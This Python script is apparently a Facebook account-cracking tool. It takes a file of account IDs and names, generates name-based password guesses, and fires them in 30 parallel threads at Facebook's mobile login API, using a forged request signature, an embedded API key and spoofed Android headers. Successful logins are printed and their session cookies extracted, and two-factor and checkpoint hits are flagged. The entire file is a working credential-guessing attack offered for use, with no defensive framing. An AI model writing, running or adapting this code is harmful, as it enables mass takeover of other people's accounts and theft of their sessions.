import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import *
import bs4
from concurrent.futures import ThreadPoolExecutor as bola
ok,cp,tf,id,idx,user,pp,ugen,ugen2,ok,cp,tf,num,loop = [],[],[],[],[],[],[],[],[],[],[],[],0,0
lines,fav,idd=[],[],[]
oks,cps,tfs=[],[],[]

import requests
import random
from uuid import uuid4
import hashlib
import json

#from os import sys as os.system

import urllib3
def sortObj(data):
  sortedObj = {}
  sort = sorted(data)
  for item in sort:
    sortedObj[item] = data[item]
  return sortedObj

def getSig(data):
  signature = ""
  for item in data:
    signature += item + "=" + data[item]
  return encmd5(signature + "62f8ce9f74b12f84c123cc23437a4a32")

def encmd5(sig):
  result = hashlib.md5(sig.encode())
  return result.hexdigest()

def logo():
  """
   ██████████  ██████████  █████████   ▀
   ███    ███  ███    ███  ███   ███  ███ 
   ███         ███    ███  ███   ███  ███ 
   ██████████  ██████████  ███   ███  ███ 
          ███  ███    ███  ███   ███  ███  
   ███    ███  ███    ███  ███   ███  ███  
   ██████████  ███    ███  ███   ███  ███ QUEEN
\033[1;97m══════════════════════════════════════════════
 [✓] Owner   : Jannat Sultan
 [✓] Github  : https://github.com/Jannat-Sultan 
 [✓] Facebook: Jam Shahrukh Official
 [✓] don't pheel me:) hatterz make me famous 
══════════════════════════════════════════════"""

def f_clone():
    #chck()
    os.system('clear')
    logo()
    print("              File Crack Menu")
    print(' -------------------------------------------')
    try:
        file = input(" [+] File : ")
        cnt=open(file).read().splitlines()
        for x in open(file,'r').readlines():
            idd.append(x.strip())
    except:
        print('  \n        File Not Found ');time.sleep(1)
        f_clone()
    p_set()

def p_set():
    #chck()
    os.system('clear')
    logo()
    sm = '1'
    lp = input(' [+] How many passwords you want to add? ')
    print('\n')
    if lp.isnumeric():
        os.system('clear')
        logo() 
        print(' \n Put {} Passwords '.format(lp))
        print(' Example: firstlast,first last,First123 etc')
        print(' -------------------------------------------')
        for x in range(int(lp)):
            pp.append(input(f' Password {x+1} : '))
        pass
    else:
        print('  \n        Put Valid One  ');time.sleep(1)
        p_set()
    with bola(max_workers=30) as crack:
        os.system("clear")
        logo()
        os.system('clear')
        logo()
        print('')
        print(' \033[1;97m[+] Total IDs : %s' %(len(idd)))
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        print('')
        total_ids = str(len(idd))
        for user in idd:
            ids,names = user.split('|')
            p_list = pp
            if sm == '1':
                crack.submit(file_c,ids,names,p_list)
            elif sm == '2':
                crack.submit(file_c,ids,names,p_list)
            else:
                crack.submit(file_c,ids,names,p_list)
        os.sys.exit()
def file_c(ids,names,p_list):
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        for pw in p_list:
            global loop, oks, cps, tfs
            ses=requests.Session()
            sys.stdout.write('\r\r\033[1;37m [ JANNAT ] %s -- \033[1;37mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            pas = pw.replace("first", first.lower()).replace("last", last.lower()).replace("First", first).replace("Last", last)
            adID = str(uuid4())
            did = str(uuid4())
            data = {
      'adid': adID,
      'format': 'json',
      'device_id': did,
      'email': ids,
      'password': pas,
      'cpl': 'true',
      'family_device_id': did,
      'credentials_type': 'device_based_login_password',
      'generate_session_cookies': '1',
      'error_detail_type': 'button_with_disabled',
      'source': 'device_based_login',
      'machine_id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=24)),
      'meta_inf_fbmeta': '',
      'advertiser_id': adID,
      'currently_logged_in_userid': '0',
      'locale': 'en_US',
      'client_country_code': 'US',
      'method': 'auth.login',
      'fb_api_req_friendly_name': 'authenticate',
      'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
      'api_key': '882a8490361da98702bf97a021ddc14d'
  }

            data['sig'] = getSig(sortObj(data))

            sim = random.choice(['2e4', '4e4'])
            headers = {
      'x-fb-connection-bandwidth': random.choice(['2e7', '3e7']),
        'x-fb-sim-hni': sim,
        'x-fb-net-hni': sim,
        'x-fb-connection-quality': 'EXCELLENT',
        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
        'user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
          #'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
  }
            resp = requests.post(url="https://b-api.facebook.com/method/auth.login", data=data, headers=headers)
            if 'c_user' in resp.text:
                print('\r\033[1;92m [JAM] '+ids+' | '+pas)
                try:
                    cokei = ";".join(i["name"]+"="+i["value"] for i in resp.json()["session_cookies"])
                except:
                    pass
                oks.append(ids)
                break
            elif 'SMS shortly' in resp.text:
                print('\r\033[1;96m [2F] '+ids+' | '+pas)
                break
            elif 'checkpoint' in resp.text:
                print('\r\033[1;93m [CP] '+ids+' | '+pas)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)

        
f_clone()
